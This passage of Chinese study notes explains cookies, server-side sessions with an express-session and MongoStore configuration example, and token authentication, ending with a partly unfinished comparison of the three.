以上是一些常用的 cookie 字段，你可以根据你的需求来设置它们。如果你想了解更多关于 cookie-parser 包的使用，你可以参考官方网站或其他相关的博客。

### 第三方cookie

当一个网站加载的时候，也会向其他的网站发送请求，会在该网站下保留其他网站的cookie，称为第三方cookie。用于跨站追踪用户行为

## Session

### 概念

session 是保存在服务器端的一块儿数据，保存当前访问用户的相关信息。

Session 是一种会话管理的技术，它可以让无状态的 HTTP 协议记住用户的信息和状态

### Session原理/流程

浏览器与服务器之间通信，这个过程称之为一次会话:session。

- 浏览器向服务器发送请求。
- 如果之前没通信过，服务器会记录当前用户的信息(有用信息)，并将信息存储到数据库中，并对应着一个id。
  - 服务器会将sessionId设置在响应头set-cookie中的方式响应给客户端；
  - session的过期时间是由cookie来设置的：max-age
- 浏览器会将sessionId记录在Cookie中。
- 浏览器再次通信，Cookie中包含着sessionId，那么服务器就可以通过id找到用户信息，进而进行操作。

### Session配置项

```js
// 设置中间件
app.use(session({
    name: 'sid',                //设置cookie的name，默认值是：connect.sid
    secret: 'atguigu',          //参与加密的字符串（又称签名）
    saveUninitialized: false,   //是否为每次请求都设置一个cookie用来存储session的id
    resave: true,               //是否在每次请求时重新保存session
    store: MongoStore.create({
        mongoUrl: 'mongodb://127.0.0.1:27017/bilibili' //数据库的连接配置
    }),
    cookie: {
        httpOnly: true, // 开启后前端无法通过 JS 操作
        maxAge: 1000 * 60 * 5 // 这一条 是控制 sessionID 的过期时间的！！！
    },
}))
```

- resave: 每次访问都会更新Session的生命周期
- maxAge：设置生命周期

**注意**

session只是保存、传输信息的工具，本身不具有校验功能，校验、查找等功能写在代码里。

**判断用户登陆状态**

- 如果存在sessionId，我们可以获取session中的信息，判断是谁登陆的。然后返回相应的数据
- 因此在访问相同域名的情况下，Cookie相同，sessionid是相同的，因此可以通过sessionid判断信息，让用户访问同域名的其他网页。

##### 3. 关于重新登陆？？

如果设置了：登陆就设置session：

- 如果Cookie中存在session，并且和数据库的相同，那么该sessionid不会修改。而是使用原来的session对象，进行增删改查。
- 如果退出登陆就销毁session，那么重新登陆意味着重新生成session对象

## Token

### 概念

Token是一种用于身份验证和授权的技术，它可以让客户端和服务端之间进行安全和高效的数据交互。

### 原理

- 用户登陆网站
- 服务器利用用户信息进行加密生成一个Token，返回数据时，将Token添加到响应头中
- 用户再次发送请求时，要“主动”携带Token来进行身份验证
- 服务器验证成功之后，再针对用户请求进行处理

### 特点

- 对数据进行加密，相较于cookie有较高的安全性
- 可以防止CSRF攻击

服务器->浏览器的加密字符换。

和cookie类似，不过请求头是token。token是手动发送（从浏览器到服务的时候是主动的），cookie是自动的。

### 相关面试题



#### Cookie、Session、Token对比

Cookie和session本质是类似的，只不过，cookie是记录的所有数据，而session设置的是一个id，最终由服务器存储。

## 对比

### Session 和 Cookie

#### 作用

- 主要是用于标识用户身份，存储少量信息

#### 存储位置

- cookie： 浏览器
- Session：服务端
- Token： 浏览器

#### 生命周期

- Session和cookie本身都可以自行设置生命周期，一般默认是关闭浏览器后会自动清楚。

- token可以手动设置生命周期
- 

#### 安全性

- cookie是明文存储和传输

- SessionId存储在cookie中，并且SessionId本身不存储信息，而信息存储在服务器的Session对象中。
- Token

#### 大小

- Session大小没有限制
- cookie： 4KB

#### 扩展性

- Token具有较强的拓展性



